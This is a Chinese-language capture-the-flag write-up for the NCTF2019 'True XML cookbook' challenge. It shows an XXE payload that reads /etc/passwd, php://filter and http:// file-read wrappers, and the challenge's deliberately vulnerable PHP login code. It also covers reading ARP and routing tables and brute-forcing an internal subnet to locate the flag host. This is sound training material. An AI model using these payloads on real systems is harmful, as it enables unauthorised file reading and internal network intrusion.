# [NCTF2019]True XML cookbook 1

## 0、知识点与技术

>   XXE外部实体注入

>   内网探测

## 1、解题

### 0、关于XXE

>   就是通过XML的头部标签引用外部文件，头部的文件内容为如下：

```xml
<?xml version="1.0" ?>
<!DOCTYPE a[   
<!ENTITY name SYSTEM "file:///etc/passwd" >]
>
# 其中 a 可以是任意的
# name 为实体的名称，是用来测试引入file文件的时候来判断是否存在回显
```

### 1、查看题目

>   查看题目抓包可以在post中发现xml

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107180100.png)

>   然后修改post的内容，在其上面添加xml标头， 可以获取到/etc/passwd文件中的内容

>   常用的XXE的文件读取的测试格式有
>
>   ```shell
>   file：//文件路径				# 基础用法
>   http://ip地址/文件路径		# 这里常用于读取内网的文件
>   php://filter/read=convert.base64-encode/resource=文件路径       # 这里读取到的文件内容为base64加密后的字符串
>   ```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107180240.png)

>   那么可以尝试直接读取一下根目录的flag，然后可以发现出现错误，并不能读取到flag文件，或者说flag文件并不在这里

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107180415.png)

>   这里虽然报错了，但是爆出了一个php文件的路径，然后读取一下这个文件的内容

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107180948.png)

>   解密后获得的文件内容为如下，但是并没有发现什么有用的信息，虽然显示了账号密码，但是使用账号密码进行登录并不会显示flag
>
>   只会显示登陆成功

```php
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = 'admin'; //账号
$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107181245.png)

>   然后接下来可以尝试读取其他文件
>
>   ```
>   /etc/hosts
>   /proc/net/arp //arp表，可以获得内网其他机器的地址
>   /proc/net/fib_trie // 路由缓存
>   ```



>   **`/etc/hosts`文件内容**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107181656.png)

>   **`/proc/net/arp`文件内容**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107181757.png)

>   **`/proc/net/fib_trie`文件内容**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107181837.png)

>   然后通过ip地址的方式一个一个尝试访问，试了`/proc/net/arp`文件中的两个ip地址发现不行，
>
>   最后测试`/proc/net/fib_trie`中的10.244.80.161，使用burpsuite爆破一下，建议1-255全试一遍，结果就是在这其中**虽然要等很久但最终可以访问成功的主机ip为**`10.244.80.146`

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/intranet/20230107175333.png)

   